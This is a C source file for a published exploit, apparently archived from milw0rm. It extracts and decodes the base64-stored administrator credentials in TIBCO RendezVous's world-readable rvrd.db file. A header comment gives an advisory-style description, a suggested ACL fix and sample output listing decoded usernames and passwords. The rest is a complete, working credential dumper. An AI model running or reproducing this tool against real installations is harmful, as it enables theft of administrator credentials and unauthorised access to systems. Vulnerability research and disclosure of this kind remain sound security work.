/*
Exploit: TIBCO RendezVous local password extractor version <=7.4.11
Affected products: Tibco RendezOVous version <=7.4.11 
Author: Andres Tarasco Acuña (atarasco @ sia.es)
Advisory: http://www.514.es
Status: Vendor notifification
Timeline:
----------------
Discovered: who cares?
Exploit coded: xxxxxxxxxxx
Vendor Notified: xxxxxxxxx
Vendor patch: xxxxxxxxxxxx
Public Disclosure: xxxxxxx

Description:
Tibco products stores login and passwords in base64 without crypting them. Password
file is also accesible for everyone (at least under win32 enviroment).

Fix: Add restrictive ACLS to avoid data leak

D:\Programación\tibco>tibco.exe c:\rvrd.db
Tibco RendezVous Password Dumper
Affected versions <=v7.4.11
Author: Andres Tarasco ( atarasco @ sia.es)
Url: http://www.514.es

[+] Tibco Logfile Opened (44068 bytes)

[+] Password Found at offset: 0xe53 (29 bytes)
    Base64: QWRtaW5pc3RyYXRvcjpBQUFBQUE=
    Decoded: Administrator:AAAAAA

[+] Password Found at offset: 0xe8a (17 bytes)
    Base64: QWRtaW46ZnV4b3I=
    Decoded: Admin:fuxor

[+] Password Found at offset: 0x104b (17 bytes)
    Base64: YWRtaW46dGVzdA==
    Decoded: admin:test

[+] Password Found at offset: 0x108a (17 bytes)
    Base64: QWRtaW46ZnV4b3I=
    Decoded: Admin:fuxor

[+] Password Found at offset: 0x10b5 (17 bytes)
    Base64: YWRtaW46bWFzdGVy
    Decoded: admin:master


*/

#include <stdio.h>
#include <windows.h>


#define DECODE64(c)  (isascii(c) ? base64val[c] :  -1)

static const char base64val[] = {
     -1, -1, -1, -1,  -1, -1, -1, -1,  -1, -1, -1, -1,  -1, -1, -1, -1,
     -1, -1, -1, -1,  -1, -1, -1, -1,  -1, -1, -1, -1,  -1, -1, -1, -1,
     -1, -1, -1, -1,  -1, -1, -1, -1,  -1, -1, -1, 62,  -1, -1, -1, 63,
     52, 53, 54, 55,  56, 57, 58, 59,  60, 61, -1, -1,  -1, -1, -1, -1,
     -1,  0,  1,  2,   3,  4,  5,  6,   7,  8,  9, 10,  11, 12, 13, 14,
     15, 16, 17, 18,  19, 20, 21, 22,  23, 24, 25, -1,  -1, -1, -1, -1,
     -1, 26, 27, 28,  29, 30, 31, 32,  33, 34, 35, 36,  37, 38, 39, 40,
     41, 42, 43, 44,  45, 46, 47, 48,  49, 50, 51, -1,  -1, -1, -1, -1
};


int Base64Decode( char* out, const char* in, unsigned long size )
{
	int len = 0;
	register unsigned char digit1, digit2, digit3, digit4;

	if (in[0] == '+' && in[1] == ' ')
		in += 2;
	if (*in == '\r')
		return(0);

	do {
		digit1 = in[0];
		if (DECODE64(digit1) ==  -1)
			return(-1);
		digit2 = in[1];
		if (DECODE64(digit2) ==  -1)
			return(-1);
		digit3 = in[2];
		if (digit3 != '=' && DECODE64(digit3) ==  -1)
			return(-1);
		digit4 = in[3];
		if (digit4 != '=' && DECODE64(digit4) ==  -1)
			return(-1);
		in += 4;
		*out++ = (DECODE64(digit1) << 2) | (DECODE64(digit2) >> 4);
		++len;
		if (digit3 != '=')
		{
			*out++ = ((DECODE64(digit2) << 4) & 0xf0) | (DECODE64(digit3) >> 2);
			++len;
			if (digit4 != '=')
			{
				*out++ = ((DECODE64(digit3) << 6) & 0xc0) | DECODE64(digit4);
				++len;
			}
		}
	} while (*in && *in != '\r' && digit4 != '=');

	return (len);
}
/******************************************************************************/
void main (int argc,char *argv[]) {

	DWORD size,i,read;
   int port;
	char *buffer,l,j,a;
	char base64pass[0xff],pass[0xff];
   unsigned char data[9] = {0x73, 0x65, 0x72, 0x70, 0x61, 0x73, 0x73, 0x00, 0x08};
	HANDLE f;
   int total=0;

   printf("Tibco RendezVous Password Dumper\n");
   printf("Author: Andres Tarasco ( atarasco @ sia.es)\n");
   printf("Url: http://www.514.es\n\n");


   if (argc!=2) {
    printf("Usage: Tibco.exe c:\\rvrd.db\n\n");
    exit(1);
   }


	f=CreateFile(argv[1],GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE , NULL, OPEN_EXISTING, 0, NULL);
	if (f!=INVALID_HANDLE_VALUE) {
		size=GetFileSize(f,NULL);
		if (size>0) {
			printf("[+] Tibco Logfile Opened (%i bytes)\n",size);
			buffer=(char *)malloc(size);
			ReadFile(f, &buffer[0], size, &read, NULL);
			for(i=0;i<size-sizeof(data);i++) {
				if (memcmp(&buffer[i],&data[0],sizeof(data))==0) {
                    total++;
					l=buffer[i+sizeof(data)];
					printf("[+] Password Found at offset: 0x%x (%i bytes)\n",i,l);
					memset(base64pass,'\0',sizeof(pass));
					memcpy(&base64pass[0],&buffer[i+sizeof(data)+1],l);
					printf("    Base64: %s\n",base64pass);
					j=Base64Decode( pass, base64pass, l );
					pass[j]='\0';
					printf("    Decoded: %s\n\n",pass);
				}
			}
            if (total==0) {
                printf("[+] Password not set: Administrator / NULL\n");
            }
		}
	} else {
		printf("[-] UNABLE TO %s\n",argv[1]);
	}
    return(total);
}

// milw0rm.com [2006-09-01]
